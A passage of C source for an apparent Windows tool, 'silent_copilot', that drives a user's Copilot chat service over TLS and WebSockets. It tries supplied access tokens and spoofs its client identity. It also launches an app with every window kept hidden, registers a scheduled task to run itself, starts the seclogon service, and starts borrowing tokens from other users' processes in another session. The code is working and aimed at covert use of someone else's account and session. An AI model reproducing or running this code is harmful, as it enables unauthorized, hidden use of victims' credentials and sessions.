                return -1; /* this server does not renegotiate; treat as failure */
            if (tc->plen > 0)
                return 1;
            /* SEC_E_OK with zero plaintext (alert-only record): keep reading */
            continue;
        }
        if (rc == SEC_I_CONTEXT_EXPIRED) {
            if (debug_on())
                err_s("[tls] context expired (clean close)\n");
            return 0;
        }
        if (rc == SEC_E_INCOMPLETE_MESSAGE) {
            int r;
            if (tc->rlen + 16384 > tc->rcap) {
                unsigned char* nb = (unsigned char*)realloc(tc->rbuf, (size_t)tc->rcap * 2);
                if (!nb)
                    return -1;
                tc->rbuf = nb;
                tc->rcap *= 2;
            }
            r = recv(tc->sock, (char*)tc->rbuf + tc->rlen, tc->rcap - tc->rlen, 0);
            if (r <= 0)
                return -1;
            tc->rlen += r;
            continue;
        }
        if (debug_on()) {
            char b[96];
            _snprintf(b, sizeof(b), "[tls] DecryptMessage rc=0x%08X rlen=%d\n", (unsigned int)rc,
                      tc->rlen);
            err_s(b);
        }
        return -1;
    }
}

/* SSL_read-shaped API: >0 bytes, 0 clean EOF, -1 error */
/* NOLINTNEXTLINE(misc-no-recursion): one bounded self-call (plain was just filled) */
static int tls_read(TlsConn* tc, unsigned char* dst, int n) {
    int f;
    if (tc->poff < tc->plen) {
        int avail = tc->plen - tc->poff;
        int take = avail < n ? avail : n;
        memcpy(dst, tc->plain + tc->poff, (size_t)take);
        tc->poff += take;
        return take;
    }
    f = tls_read_fill(tc);
    if (f <= 0)
        return f;
    return tls_read(tc, dst, n); /* terminates: plain was just filled */
}

static void tls_free(TlsConn* tc) {
    if (!tc)
        return;
    if (tc->have_ctxt)
        DeleteSecurityContext(&tc->ctxt);
    free(tc->rbuf);
    free(tc->wstage);
    free(tc->plain);
    free(tc);
}

/* ------------------------------------------------------------------ */
/* WebSocket framing over TLS                                          */
/* ------------------------------------------------------------------ */
static int read_full(TlsConn* tc, unsigned char* b, int n) {
    int got = 0;
    while (got < n) {
        int r = tls_read(tc, b + got, n - got);
        if (r <= 0)
            return -1;
        got += r;
    }
    return got;
}

static int ws_send_msg(TlsConn* tc, int opcode, const char* data, int len) {
    unsigned char hdr[14];
    unsigned char mask[4];
    int hl = 0, i, sent = 0;
    hdr[hl++] = (unsigned char)(0x80 | opcode); /* FIN */
    if (len < 126)
        hdr[hl++] = (unsigned char)(0x80 | len);
    else if (len <= 0xFFFF) {
        hdr[hl++] = 0xFE;
        hdr[hl++] = (unsigned char)(len >> 8);
        hdr[hl++] = (unsigned char)(len & 0xFF);
    } else
        return -1;
    rand_bytes(mask, 4);
    memcpy(hdr + hl, mask, 4);
    hl += 4;
    if (tls_write(tc, hdr, hl) != 0)
        return -1;
    while (sent < len) {
        unsigned char chunk[4096];
        int c = len - sent;
        if (c > (int)sizeof(chunk))
            c = (int)sizeof(chunk);
        for (i = 0; i < c; i++)
            chunk[i] = (unsigned char)data[sent + i] ^ mask[(sent + i) & 3];
        if (tls_write(tc, chunk, c) != 0)
            return -1;
        sent += c;
    }
    return 0;
}

/* receive one complete WS message payload (handles fragmentation);
 * returns opcode (1/2 data, 8 close, 9 ping, 10 pong) or -1 */
static int ws_recv_msg(TlsConn* tc, char* buf, int cap, int* opcode_out) {
    int total = 0;
    int first_op = -1;
    for (;;) {
        unsigned char hdr[2];
        unsigned char mask[4] = {0, 0, 0, 0};
        int fin, opcode, masked;
        unsigned long long len, got;
        if (read_full(tc, hdr, 2) < 0)
            return -1;
        fin = (hdr[0] & 0x80) != 0;
        opcode = hdr[0] & 0x0F;
        masked = (hdr[1] & 0x80) != 0;
        len = hdr[1] & 0x7F;
        if (len == 126) {
            unsigned char e[2];
            if (read_full(tc, e, 2) < 0)
                return -1;
            len = ((unsigned long long)e[0] << 8) | e[1];
        } else if (len == 127) {
            unsigned char e[8];
            int i;
            len = 0;
            if (read_full(tc, e, 8) < 0)
                return -1;
            for (i = 0; i < 8; i++)
                len = (len << 8) | e[i];
        }
        if (masked && read_full(tc, mask, 4) < 0)
            return -1;
        if (opcode == 9 || opcode == 10) { /* ping/pong: handle inline */
            unsigned char pl[125];
            if (len > sizeof(pl))
                return -1;
            if (read_full(tc, pl, (int)len) < 0)
                return -1;
            if (masked) {
                int i;
                for (i = 0; i < (int)len; i++)
                    pl[i] ^= mask[i & 3];
            }
            if (opcode == 9)
                ws_send_msg(tc, 10, (const char*)pl, (int)len);
            continue;
        }
        if (opcode == 8) {
            *opcode_out = 8;
            return total;
        }
        if (opcode == 1 || opcode == 2 || opcode == 0) {
            if (first_op < 0)
                first_op = (opcode == 0 ? 1 : opcode);
            got = 0;
            while (got < len) {
                int want = (int)((len - got) > (unsigned long long)(cap - 1 - total)
                                     ? (unsigned long long)(cap - 1 - total)
                                     : (len - got));
                if (want <= 0) { /* message bigger than cap: drain */
                    unsigned char drain[4096];
                    int d = (int)((len - got) > sizeof(drain) ? sizeof(drain) : (len - got));
                    if (read_full(tc, drain, d) < 0)
                        return -1;
                    got += (unsigned long long)d;
                    continue;
                }
                if (read_full(tc, (unsigned char*)buf + total, want) < 0)
                    return -1;
                if (masked) {
                    int i;
                    for (i = 0; i < want; i++)
                        buf[total + i] = (char)((unsigned char)buf[total + i] ^
                                                mask[(got + (unsigned long long)i) & 3]);
                }
                total += want;
                got += (unsigned long long)want;
            }
            buf[total] = 0;
            if (fin) {
                *opcode_out = first_op;
                return total;
            }
        } else
            return -1;
    }
}

/* ------------------------------------------------------------------ */
/* ------------------------------------------------------------------ */
/* one chathub attempt with a given access token; a fresh, client-generated
 * conversation id is used (substrate creates a new conversation for it) */
static int try_token(const char* prompt_json, const char* token, int with_extras) {
    static WSADATA wsa;
    static int wsa_up = 0;
    SOCKET sock = INVALID_SOCKET;
    struct addrinfo *ai = NULL, hints;
    TlsConn* tls = NULL;
    char sess[33], crid[37], xsid[37], trace[33], rid[33], convid[37];
    char *path = NULL, *req = NULL, *chat = NULL, *vars_enc = NULL;
    char *recv = NULL, *text = NULL;
    int rc = 0, got_text = 0, n, pathlen;
    DWORD t_start;
    int to = PAIR_TIMEOUT_MS;

    if (!wsa_up) {
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
            return 0;
        wsa_up = 1;
    }
    err_s("[*] trying token, tail=");
    err_s(token + (strlen(token) > 24 ? strlen(token) - 24 : 0));
    err_s("\n");

    hex32(sess);
    uuid4(crid);
    uuid4(xsid);
    hex32(trace);
    hex32(rid);
    uuid4(convid); /* fresh conversation per attempt */

    /* build URL path */
    path = (char*)malloc(8192);
    req = (char*)malloc(12288);
    vars_enc = (char*)malloc((size_t)MAX_VARS * 3U);
    if (!path || !req || !vars_enc)
        goto done;
    {
        int i, j = 0;
        static const char* hexd = "0123456789ABCDEF";
        const char* vv = with_extras ? g_vars : "";
        size_t vcap = (size_t)MAX_VARS * 3U;
        for (i = 0; vv[i] && (size_t)j < vcap - 4; i++) {
            char c = vv[i];
            if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') ||
                c == '-' || c == '_' || c == '.' || c == '~')
                vars_enc[j++] = c;
            else {
                vars_enc[j++] = '%';
                vars_enc[j++] = hexd[(c >> 4) & 0xF];
                vars_enc[j++] = hexd[c & 0xF];
            }
        }
        vars_enc[j] = 0;
    }
    pathlen = _snprintf(path, 8192,
                        "%s%s@%s?chatsessionid=%s&XRoutingParameterSessionKey=%s"
                        "&clientrequestid=%s&X-SessionId=%s&ConversationId=%s&access_token=%s"
                        "&variants=%s&source=%%22officedesktop%%22&product=Office"
                        "&agentHost=Bizchat.FullScreen&licenseType=Starter"
                        "&isEdu=false&agent=web&scenario=OfficeWebPaidConsumerCopilot",
                        CHATHUB_PREFIX, with_extras ? g_oid : "", g_sten, sess, sess, crid, xsid,
                        convid, token, vars_enc);
    if (pathlen <= 0 || pathlen >= 8192)
        goto done;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(HOST_NAME, "443", &hints, &ai) != 0) {
        err_s("dns fail");
        goto done;
    }
    sock = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
    if (sock == INVALID_SOCKET)
        goto done;
    if (connect(sock, ai->ai_addr, (int)ai->ai_addrlen) != 0) {
        err_s("connect fail");
        goto done;
    }
    /* total attempt timeout via recv timeout on the socket */
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&to, sizeof(to));

    tls = tls_connect(sock, HOST_NAME);
    if (!tls) {
        err_s("tls fail");
        goto done;
    }

    /* websocket upgrade */
    {
        unsigned char keyb[16];
        char key64[25];
        static const char* b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        int i, j = 0;
        rand_bytes(keyb, 16);
        for (i = 0; i < 15; i += 3) {
            unsigned v = (keyb[i] << 16) | (keyb[i + 1] << 8) | keyb[i + 2];
            key64[j++] = b64[(v >> 18) & 63];
            key64[j++] = b64[(v >> 12) & 63];
            key64[j++] = b64[(v >> 6) & 63];
            key64[j++] = b64[v & 63];
        }
        key64[j++] = b64[(keyb[15] >> 2) & 63];
        key64[j++] = b64[(keyb[15] << 4) & 63];
        key64[j++] = '=';
        key64[j++] = '=';
        key64[j] = 0;
        n = _snprintf(req, 12288,
                      "GET %s HTTP/1.1\r\nHost: %s\r\n"
                      "Upgrade: websocket\r\nConnection: Upgrade\r\n"
                      "Sec-WebSocket-Key: %s\r\n"
                      "Sec-WebSocket-Version: 13\r\n"
                      "Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits\r\n"
                      "User-Agent: Python/3.13 websockets/17.0.1\r\n\r\n",
                      path, HOST_NAME, key64);
    }
    if (tls_write(tls, (const unsigned char*)req, n) != 0)
        goto done;

    /* read HTTP response headers (until blank line) */
    {
        int used = 0, done_h = 0;
        while (!done_h && used < 4096) {
            unsigned char c;
            int r = tls_read(tls, &c, 1);
            if (r <= 0)
                goto done;
            req[used++] = (char)c;
            if (used >= 4 && memcmp(req + used - 4, "\r\n\r\n", 4) == 0)
                done_h = 1;
        }
        req[used] = 0;
        if (debug_on()) {
            req[used > 700 ? 700 : used] = 0;
            err_s("[dbg] upgrade response: ");
            err_s(req);
            err_s("\n");
        }
        if (strstr(req, " 101") == NULL) {
            req[used > 200 ? 200 : used] = 0;
            err_s("upgrade rejected");
            goto done;
        }
    }

    /* SignalR handshake + chat invocation */
    recv = (char*)malloc((size_t)WS_RECV_CAP);
    text = (char*)malloc((size_t)TEXT_CAP);
    chat = (char*)malloc(strlen(prompt_json) + 2048);
    if (!recv || !text || !chat)
        goto done;
    if (ws_send_msg(tls, 1, "{\"protocol\":\"json\",\"version\":1}\x1e", 32) != 0)
        goto done;
    _snprintf(chat, (int)(strlen(prompt_json) + 2048),
              "{\"type\":4,\"invocationId\":\"0\",\"target\":\"chat\",\"arguments\":[{"
              "\"source\":\"officedesktop\",\"clientCorrelationId\":\"%s\",\"sessionId\":\"%s\","
              "\"optionsSets\":[\"flux_v3_progress_messages\",\"enable_msa_user\","
              "\"rich_responses\",\"enable_batch_token_processing\"],"
              "\"streamingMode\":\"ConciseWithPadding\","
              "\"allowedMessageTypes\":[\"Chat\",\"Suggestion\",\"Progress\","
              "\"GeneratedCode\",\"Disengaged\",\"EndOfRequest\"],\"sliceIds\":[],"
              "\"traceId\":\"%s\",\"isStartOfSession\":false,"
              "\"clientInfo\":{\"clientPlatform\":\"win32\",\"clientAppName\":\"Office\"},"
              "\"message\":{\"author\":\"user\",\"inputMethod\":\"Keyboard\","
              "\"text\":\"%s\",\"messageType\":\"Chat\","
              "\"requestId\":\"%s\",\"locale\":\"en-us\"},"
              "\"plugins\":[],\"tone\":\"Magic\",\"isSbsSupported\":true}]}\x1e",
              sess, sess, trace, prompt_json, rid);
    if (ws_send_msg(tls, 1, chat, (int)strlen(chat)) != 0) {
        err_s("ws send fail");
        goto done;
    }

    /* receive until final stream item / completion / timeout */
    t_start = GetTickCount();
    for (;;) {
        int opcode = -1;
        int r;
        if (GetTickCount() - t_start > PAIR_TIMEOUT_MS)
            break;
        r = ws_recv_msg(tls, recv, WS_RECV_CAP, &opcode);
        if (r < 0)
            break;
        if (opcode == 8)
            break; /* close */
        if (opcode != 1 && opcode != 2)
            continue;
        if (debug_on()) {
            int show = r > 6000 ? 6000 : r;
            err_s("[dbg] frame op=");
            {
                char b[16];
                _snprintf(b, sizeof(b), "%d len=%d: ", opcode, r);
                err_s(b);
            }
            {
                char t601[6102];
                memcpy(t601, recv, (size_t)show);
                t601[show] = 0;
                err_s(t601);
                err_s("\n");
            }
        }
        {
            char* f = recv;
            int done_frames = 0;
            while (!done_frames) {
                char* sep = strchr(f, '\x1e');
                int ty;
                if (sep)
                    *sep = 0;
                else
                    done_frames = 1;
                if (*f) {
                    ty = json_type(f);
                    if (ty == 2 || ty == 3) {
                        /* completion: result.message is definitive; fall
                         * back to the scoped messages text if absent */
                        char fin_text[TEXT_CAP];
                        if (json_result_message(f, fin_text, (int)sizeof(fin_text)) ||
                            json_extract_reply(f, fin_text, (int)sizeof(fin_text))) {
                            size_t tl = strlen(fin_text);
                            if (tl > (size_t)TEXT_CAP - 1)
                                tl = (size_t)TEXT_CAP - 1;
                            memcpy(text, fin_text, tl);
                            text[tl] = 0;
                            got_text = 1;
                        }
                        goto streamed;
                    }
                    if (ty == 1) {
                        char frag_text[TEXT_CAP];
                        if (json_extract_reply(f, frag_text, (int)sizeof(frag_text))) {
                            size_t tl = strlen(frag_text);
                            if (tl > (size_t)TEXT_CAP - 1)
                                tl = (size_t)TEXT_CAP - 1;
                            memcpy(text, frag_text, tl);
                            text[tl] = 0;
                            got_text = 1;
                        }
                    }
                }
                if (!done_frames)
                    f = sep + 1;
            }
        }
    }
streamed:
    if (got_text && text[0]) {
        out_s(text);
        out_s("\n");
        rc = 1;
    }
    err_s(rc ? "[+] reply captured\n" : "[-] attempt ended without reply\n");
done:
    if (tls)
        tls_free(tls);
    if (sock != INVALID_SOCKET)
        closesocket(sock);
    if (ai)
        freeaddrinfo(ai);
    if (path)
        free(path);
    if (req)
        free(req);
    if (vars_enc)
        free(vars_enc);
    if (recv)
        free(recv);
    if (text)
        free(text);
    if (chat)
        free(chat);
    return rc;
}

/* ------------------------------------------------------------------ */
/* hidden app launch                                                   */
/* ------------------------------------------------------------------ */
static int hwinevent_active = 0;
static int g_hidden_count = 0;

/* NOLINTBEGIN(bugprone-easily-swappable-parameters): fixed Win32 callback signature */
static void CALLBACK hide_win_event(HWINEVENTHOOK hk, DWORD ev, HWND hwnd, LONG obj, LONG child,
                                    DWORD tid, DWORD tms)
/* NOLINTEND(bugprone-easily-swappable-parameters) */
{
    DWORD pid = 0;
    HANDLE h;
    char nm[MAX_PATH];
    (void)hk;
    (void)child;
    (void)tid;
    (void)tms;
    if (ev != EVENT_OBJECT_CREATE && ev != EVENT_OBJECT_SHOW)
        return;
    if (obj != OBJID_WINDOW || hwnd == NULL)
        return;
    GetWindowThreadProcessId(hwnd, &pid);
    h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h)
        return;
    {
        DWORD sz = sizeof(nm) - 1;
        WCHAR wnm[MAX_PATH];
        if (QueryFullProcessImageNameW(h, 0, wnm, &sz)) {
            int i = 0, last = 0;
            for (i = 0; wnm[i]; i++)
                if (wnm[i] == L'\\' || wnm[i] == L'/')
                    last = i + 1;
            i = 0;
            while (wnm[last + i] && i < (int)sizeof(nm) - 1) {
                WCHAR c = wnm[last + i];
                nm[i] = (c < 128) ? (char)c : '?';
                if (nm[i] >= 'A' && nm[i] <= 'Z')
                    nm[i] = (char)(nm[i] + 32);
                i++;
            }
            nm[i] = 0;
            if (strcmp(nm, APP_EXE) == 0 && IsWindowVisible(hwnd)) {
                ShowWindow(hwnd, SW_HIDE);
                g_hidden_count++;
            }
        }
    }
    CloseHandle(h);
}

/* IApplicationActivationManager minimal COM driver (C ABI) */
typedef struct IAAMVtbl IAAMVtbl;
typedef struct IAAM {
    const IAAMVtbl* lp;
} IAAM;
struct IAAMVtbl {
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IAAM*, const GUID*, void**);
    ULONG(STDMETHODCALLTYPE* AddRef)(IAAM*);
    ULONG(STDMETHODCALLTYPE* Release)(IAAM*);
    HRESULT(STDMETHODCALLTYPE* ActivateApplication)(IAAM*, LPCWSTR, LPCWSTR, DWORD, DWORD*);
    HRESULT(STDMETHODCALLTYPE* ActivateForFile)(IAAM*, LPCWSTR, void*, LPCWSTR, DWORD*);
    HRESULT(STDMETHODCALLTYPE* ActivateForProtocol)(IAAM*, LPCWSTR, void*, DWORD*);
};

static int launch_in_session(DWORD session_id);

/* activate the app IN THE CURRENT SESSION and keep its windows hidden */
/* The hide/launch body, runnable as a worker thread (interactive fast path)
 * or as the standalone --launch-hide child process (SSH/foreign-session path).
 * Out-of-context WinEvent hooks require a message loop in the installing
 * thread — the watch loop below pumps one. */
static DWORD WINAPI hide_worker(LPVOID unused) {
    (void)unused;
    static const GUID CLSID_AAM = {
        0x45BA127D, 0x10A8, 0x46EA, {0x8A, 0xB7, 0x56, 0xEA, 0x90, 0x78, 0x94, 0x3C}};
    static const GUID IID_IAAM = {
        0x2e941141, 0x7f97, 0x4756, {0xba, 0x1d, 0x9d, 0xec, 0xde, 0x89, 0x4a, 0x3d}};
    IAAM* aam = NULL;
    HRESULT hr;
    DWORD pid = 0;
    WCHAR waumid[128];
    HWINEVENTHOOK hk1, hk2;
    int t = 0;
    int i;

    for (i = 0; AUMID[i] && i < 127; i++)
        waumid[i] = (WCHAR)AUMID[i];
    waumid[i] = 0;

    dbg_log("launch-hide: entered");

    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr))
        return 10;

    hk1 = SetWinEventHook(EVENT_OBJECT_CREATE, EVENT_OBJECT_CREATE, NULL, hide_win_event, 0, 0,
                          WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
    hk2 = SetWinEventHook(EVENT_OBJECT_SHOW, EVENT_OBJECT_SHOW, NULL, hide_win_event, 0, 0,
                          WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
    hwinevent_active = (hk1 != NULL || hk2 != NULL);

    hr = CoCreateInstance(&CLSID_AAM, NULL, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER, &IID_IAAM,
                          (void**)&aam);
    if (FAILED(hr) || !aam) {
        dbg_log("launch-hide: CoCreateInstance failed");
        return 11;
    }
    hr = aam->lp->ActivateApplication(aam, waumid, NULL, 0, &pid);
    if (FAILED(hr)) {
        aam->lp->Release(aam);
        dbg_log("launch-hide: ActivateApplication failed");
        return 12;
    }
    aam->lp->Release(aam);
    {
        char b[96];
        _snprintf(b, sizeof(b), "launch-hide: activated pid=%lu hooks=%d", (unsigned long)pid,
                  hwinevent_active);
        dbg_log(b);
    }

    /* keep the hooks alive; pump messages (out-of-context hook delivery
     * requires a message loop) and brute-hide periodically as backstop */
    while (t < HIDE_WATCH_SEC * 10) {
        DWORD pids[64];
        int n = collect_pids(pids, 64);
        int i2;
        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        for (i2 = 0; i2 < n; i2++) {
            HWND hwnd = NULL;
            for (;;) {
                hwnd = FindWindowExW(NULL, hwnd, NULL, NULL);
                if (!hwnd)
                    break;
                {
                    DWORD wpid = 0;
                    GetWindowThreadProcessId(hwnd, &wpid);
                    if (wpid == pids[i2] && IsWindowVisible(hwnd)) {
                        ShowWindow(hwnd, SW_HIDE);
                        g_hidden_count++;
                    }
                }
            }
        }
        Sleep(100);
        t++;
        if ((t % 100) == 0) {
            char b[96];
            _snprintf(b, sizeof(b), "launch-hide: watching t=%ds hidden=%d", t / 10,
                      g_hidden_count);
            dbg_log(b);
        }
    }
    {
        char b[96];
        _snprintf(b, sizeof(b), "launch-hide: exit hidden=%d", g_hidden_count);
        dbg_log(b);
    }
    if (hk1)
        UnhookWinEvent(hk1);
    if (hk2)
        UnhookWinEvent(hk2);
    CoUninitialize();
    return 0;
}

static int do_launch_hide(void) {
    return (int)hide_worker(NULL);
}

/* launch silent_copilot.exe --launch-hide inside the given interactive
 * session, borrowing a token from a user process running there */
/* ------------------------------------------------------------------ */
/* Task Scheduler fallback for hidden launch (works even when the      */
/* Secondary Logon service is stopped, unlike CreateProcessWithTokenW)  */
/* ------------------------------------------------------------------ */
static const GUID MY_CLSID_TaskScheduler = {
    0x0f87369f, 0xa4e5, 0x4cfc, {0xbd, 0x3e, 0x73, 0xe6, 0x15, 0x45, 0x72, 0xdd}};
static const GUID MY_IID_ITaskService = {
    0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};
static const GUID MY_IID_IExecAction = {
    0x4c3d624d, 0xfd6b, 0x49a3, {0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47}};
#define CLSID_TaskScheduler MY_CLSID_TaskScheduler
#define IID_ITaskService MY_IID_ITaskService
#define IID_IExecAction MY_IID_IExecAction

static void task_delete(void) {
    HRESULT hr;
    ITaskService* ts = NULL;
    ITaskFolder* folder = NULL;
    VARIANT vempty;
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    VariantInit(&vempty);
    if (SUCCEEDED(CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                                   &IID_ITaskService, (void**)&ts))) {
        if (SUCCEEDED(ITaskService_Connect(ts, vempty, vempty, vempty, vempty)) &&
            SUCCEEDED(ITaskService_GetFolder(ts, L"\\", &folder))) {
            ITaskFolder_DeleteTask(folder, L"SilentCopilotBoop", 0);
            ITaskFolder_Release(folder);
        }
        ITaskService_Release(ts);
    }
    if (hr == S_OK || hr == S_FALSE)
        CoUninitialize();
}

static int launch_via_tasksched(void) {
    HRESULT hr;
    ITaskService* ts = NULL;
    ITaskFolder* folder = NULL;
    ITaskDefinition* def = NULL;
    ITaskSettings* set = NULL;
    IActionCollection* acts = NULL;
    IAction* act = NULL;
    IExecAction* exec = NULL;
    IRegisteredTask* rt = NULL;
    VARIANT vempty, vuser, vpwd, vsddl, vargs;
    BSTR buser = NULL;
    char host[128], user[128], hn[256];
    WCHAR wself[MAX_PATH];
    char self[MAX_PATH];
    DWORD n;
    int rc = 1, i;
    HRESULT coin = E_FAIL;

    task_delete();
    coin = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(coin) && coin != RPC_E_CHANGED_MODE) {
        dbg_log("tasksched: coinit failed");
        return 1;
    }
    if (GetModuleFileNameA(NULL, self, MAX_PATH) == 0)
        return 1;
    for (i = 0; self[i] && i < MAX_PATH - 1; i++)
        wself[i] = (WCHAR)self[i];
    wself[i] = 0;
    n = sizeof(host);
    if (!GetComputerNameExA(ComputerNameNetBIOS, host, &n))
        strcpy(host, ".");
    n = sizeof(user);
    if (!GetUserNameA(user, &n))
        strcpy(user, "");
    _snprintf(hn, sizeof(hn), "%s\\%s", host, user);
    VariantInit(&vempty);
    VariantInit(&vpwd);
    VariantInit(&vsddl);
    VariantInit(&vargs);
    VariantInit(&vuser);
    vuser.vt = VT_BSTR;
    buser = SysAllocStringLen(NULL, (UINT)strlen(hn));
    if (!buser)
        return 1;
    for (i = 0; hn[i]; i++)
        buser[i] = (WCHAR)hn[i];
    buser[strlen(hn)] = 0;
    vuser.bstrVal = buser;

    hr = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService,
                          (void**)&ts);
    if (FAILED(hr) || !ts) {
        dbg_log("tasksched: create failed");
        goto out;
    }
    hr = ITaskService_Connect(ts, vempty, vempty, vempty, vempty);
    if (FAILED(hr)) {
        dbg_log("tasksched: connect failed");
        goto out;
    }
    hr = ITaskService_GetFolder(ts, L"\\", &folder);
    if (FAILED(hr)) {
        dbg_log("tasksched: folder failed");
        goto out;
    }
    hr = ITaskService_NewTask(ts, 0, &def);
    if (FAILED(hr) || !def) {
        dbg_log("tasksched: newtask failed");
        goto out;
    }
    if (SUCCEEDED(ITaskDefinition_get_Settings(def, &set))) {
        ITaskSettings_put_StartWhenAvailable(set, VARIANT_TRUE);
        ITaskSettings_put_DisallowStartIfOnBatteries(set, VARIANT_FALSE);
        ITaskSettings_put_StopIfGoingOnBatteries(set, VARIANT_FALSE);
        ITaskSettings_put_ExecutionTimeLimit(set, L"PT5M");
        ITaskSettings_Release(set);
    }
    if (SUCCEEDED(ITaskDefinition_get_Actions(def, &acts))) {
        if (SUCCEEDED(IActionCollection_Create(acts, TASK_ACTION_EXEC, &act))) {
            if (SUCCEEDED(IAction_QueryInterface(act, &IID_IExecAction, (void**)&exec))) {
                WCHAR wargs[32];
                const wchar_t* a = L"--launch-hide";
                if (g_trace)
                    a = L"--launch-hide --trace";
                for (i = 0; a[i] && i < 31; i++)
                    wargs[i] = (WCHAR)a[i];
                wargs[i] = 0;
                hr = IExecAction_put_Path(exec, wself);
                if (SUCCEEDED(hr)) {
                    hr = IExecAction_put_Arguments(exec, wargs);
                    if (FAILED(hr)) {
                        dbg_log("tasksched: exec args failed");
                        goto out;
                    }
                } else {
                    dbg_log("tasksched: exec path failed");
                    goto out;
                }
                IExecAction_Release(exec);
            }
            IAction_Release(act);
        }
        IActionCollection_Release(acts);
    }
    hr =
        ITaskFolder_RegisterTaskDefinition(folder, L"SilentCopilotBoop", def, TASK_CREATE_OR_UPDATE,
                                           vuser, vpwd, TASK_LOGON_INTERACTIVE_TOKEN, vsddl, &rt);
    if (FAILED(hr) || !rt) {
        dbg_log("tasksched: register failed");
        goto out;
    }
    {
        IRunningTask* runt = NULL;
        hr = IRegisteredTask_Run(rt, vargs, &runt);
        if (runt)
            IRunningTask_Release(runt);
    }
    if (FAILED(hr)) {
        dbg_log("tasksched: run failed");
        goto out;
    }
    {
        char b[160];
        _snprintf(b, sizeof(b), "tasksched: launched as %s", hn);
        dbg_log(b);
    }
    rc = 0;
out:
    if (buser)
        SysFreeString(buser);
    if (rt)
        IRegisteredTask_Release(rt);
    if (def)
        ITaskDefinition_Release(def);
    if (folder)
        ITaskFolder_Release(folder);
    if (ts)
        ITaskService_Release(ts);
    if (coin == S_OK || coin == S_FALSE)
        CoUninitialize();
    return rc;
}

/* CreateProcessWithTokenW depends on the Secondary Logon service; make sure
 * it is up (best effort - silently ignored without admin rights) */
/* Returns nonzero when THIS process is already running in an active
 * interactive session owned by the current user (e.g. from a console/PS
 * prompt). In that case the hidden-app launch needs no seclogon, no token
 * borrowing and no Task Scheduler: we activate the AUMID from this process
 * and hide its windows on a worker thread. */
static int self_in_active_interactive_session(void) {
    DWORD sid = 0xFFFFFFFF;
    LPSTR uname = NULL;
    DWORD ulen = 0;
    int* statep = NULL;
    int rc = 0;
    char myname[128];
    DWORD mylen = sizeof(myname);
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &sid))
        return 0;
    if (!WTSQuerySessionInformationA(WTS_CURRENT_SERVER_HANDLE, sid, WTSConnectState,
                                     (LPSTR*)&statep, &ulen) ||
        !statep)
        return 0;
    rc = (*statep == WTSActive);
    WTSFreeMemory(statep);
    if (!rc)
        return 0;
    if (!GetUserNameA(myname, &mylen))
        myname[0] = 0;
    if (WTSQuerySessionInformationA(WTS_CURRENT_SERVER_HANDLE, sid, WTSUserName, &uname, &ulen) &&
        uname) {
        rc = (uname[0] && myname[0] && _stricmp(uname, myname) == 0);
        WTSFreeMemory(uname);
    }
    return rc;
}

static void seclogon_ensure(void) {
    SC_HANDLE scm = NULL, svc = NULL;
    SERVICE_STATUS ss;
    scm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm)
        return;
    svc = OpenService(scm, "seclogon", SERVICE_QUERY_STATUS | SERVICE_START);
    if (!svc) {
        CloseServiceHandle(scm);
        return;
    }
    if (QueryServiceStatus(svc, &ss) && ss.dwCurrentState == SERVICE_STOPPED) {
        if (StartService(svc, 0, NULL)) {
            int w;
            dbg_log("launch: started seclogon");
            /* wait until RUNNING — CreateProcessWithTokenW against a
             * STARTING service hangs ~20 s and fails with gle=1053 */
            for (w = 0; w < 40; w++) {
                if (QueryServiceStatus(svc, &ss) && ss.dwCurrentState == SERVICE_RUNNING) {
                    dbg_log("launch: seclogon running");
                    break;
                }
                Sleep(350);
            }
        }
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
}

static int launch_in_session(DWORD session_id) {
    DWORD pids[512];
    int n = 0, i;
    HANDLE snap;
    PROCESSENTRY32W pe;
    char self[MAX_PATH];
    HANDLE my_tok = NULL;
    PSID my_sid = NULL;
    DWORD my_sid_len = 0;
    int rc = 1;
    int borrows = 0;

    if (GetModuleFileNameA(NULL, self, MAX_PATH) == 0)
        return 1;
    seclogon_ensure();
    {
        char b[128];
        _snprintf(b, sizeof(b), "launch_in_session: sid=%lu self=%s", (unsigned long)session_id,
                  self);
        dbg_log(b);
    }
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &my_tok))
        return 1;
    {
        DWORD ret = 0;
        GetTokenInformation(my_tok, TokenUser, NULL, 0, &ret);
        if (ret) {
            BYTE* tb = (BYTE*)malloc(ret);
            if (tb && GetTokenInformation(my_tok, TokenUser, tb, ret, &ret)) {
                my_sid_len = GetLengthSid(((TOKEN_USER*)tb)->User.Sid);
                my_sid = malloc(my_sid_len);
                if (my_sid)
                    CopySid(my_sid_len, my_sid, ((TOKEN_USER*)tb)->User.Sid);
            }
            if (tb)
                free(tb);
        }
    }

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
